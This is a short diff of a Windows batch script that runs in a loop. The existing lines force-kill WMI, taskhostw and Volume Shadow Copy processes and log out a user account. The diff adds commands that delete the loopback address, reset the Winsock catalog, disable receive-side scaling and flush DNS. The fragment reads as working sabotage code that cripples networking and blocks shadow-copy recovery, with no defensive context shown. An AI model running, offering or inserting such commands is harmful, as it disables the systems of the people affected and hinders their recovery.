@@ -129,5 +129,9 @@ cls && net user "DefaultAccount" logout && cls
 taskkill /IM wmi* /F
 taskkill /IM taskhostw* /F
 taskkill /IM VSS* /F
+netsh interface ipv4 delete address "Loopback Pseudo-Interface 1"  addr=127.0.0.1 gateway=all
+netsh winsock reset catalog
+netsh interface tcp set global rss=disabled
+ipconfig /flushdns
 
 goto loop
